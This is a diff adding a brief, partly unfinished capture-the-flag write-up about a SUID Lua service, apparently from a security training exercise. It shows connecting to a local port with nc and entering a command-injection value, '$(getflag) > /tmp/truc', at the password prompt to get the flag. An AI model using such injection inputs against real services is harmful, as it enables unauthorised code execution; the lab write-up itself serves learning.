@@ -1,0 +1,21 @@
+The file present is a Lua file.
+
+The file is having a SUID bit, so we might be able to exploit it.
+
+// To complete
+
+There is a md5 hash inside, but it is a false path
+
+We cam create a code execution, by connecting doing:
+
+nc 127.0.0.1 5151
+
+and when the password is asked, type : 
+
+$(getflag) > /tmp/truc
+
+then,
+
+cat /tmp/truc
+
+And the token is given
